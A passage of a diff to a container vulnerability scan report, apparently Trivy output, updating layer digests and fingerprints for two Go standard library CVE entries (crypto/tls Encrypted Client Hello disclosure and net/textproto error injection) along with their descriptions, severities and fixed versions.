+      Digest: sha256:604c1010afb5bf9e9e06c9e56ce6d5158b10aded2bdbe92562dadc4ee6c7523d
+      DiffID: sha256:84b651ec5f5694c97a88671f0f61cc76ca224ce8707d9afbb07074e22b1af86c
     PrimaryURL: https://avd.aquasec.com/nvd/cve-2026-42505
     DataSource:
       ID: govulndb
       Name: The Go Vulnerability Database
       URL: https://pkg.go.dev/vuln/
-    Fingerprint: sha256:9ecdb4606b1e0998c28f8693240cc7360a87833f709ae9e2503c5843d99e1ed6
+    Fingerprint: sha256:7d0713a09e574f5dde545da77a7734fee21a1bf73d92fb284199b764a75d0da6
     Title: 'crypto/tls: golang: Go crypto/tls: Information disclosure in Encrypted Client Hello'
     Description: Handshakes which used Encrypted Client Hello could be de-anonymized by a passive network observer due to a disclosure of pre-shared key identities in the unencrypted client hello.
     Severity: MEDIUM
@@ -3356,14 +2632,14 @@
     FixedVersion: 1.25.11, 1.26.4
     Status: fixed
     Layer:
-      Digest: sha256:98a7b344c948845d318c21db5437a29354d19538e300c6997c001601e2a6e5af
-      DiffID: sha256:d39069cbf98f2f0d051ebefc817aed342512d10a9a172e154f0b8ad928e980c9
+      Digest: sha256:604c1010afb5bf9e9e06c9e56ce6d5158b10aded2bdbe92562dadc4ee6c7523d
+      DiffID: sha256:84b651ec5f5694c97a88671f0f61cc76ca224ce8707d9afbb07074e22b1af86c
     PrimaryURL: https://avd.aquasec.com/nvd/cve-2026-42507
     DataSource:
       ID: govulndb
       Name: The Go Vulnerability Database
       URL: https://pkg.go.dev/vuln/
-    Fingerprint: sha256:9f45b05873c8a379ae57db0697da877f0f809c797e3141a87dfd1ba5693b6f0c
+    Fingerprint: sha256:80615a37d4d81c30eebd05d6c67792a8f1cb97f405aaedfe0227e33737d67717
     Title: 'net/textproto: golang: Golang net/textproto: Misleading error messages via input injection'
     Description: When returning errors, functions in the net/textproto package would include its input as part of the error. This might allow an attacker to inject misleading content to errors that are printed or logged.
     Severity: MEDIUM
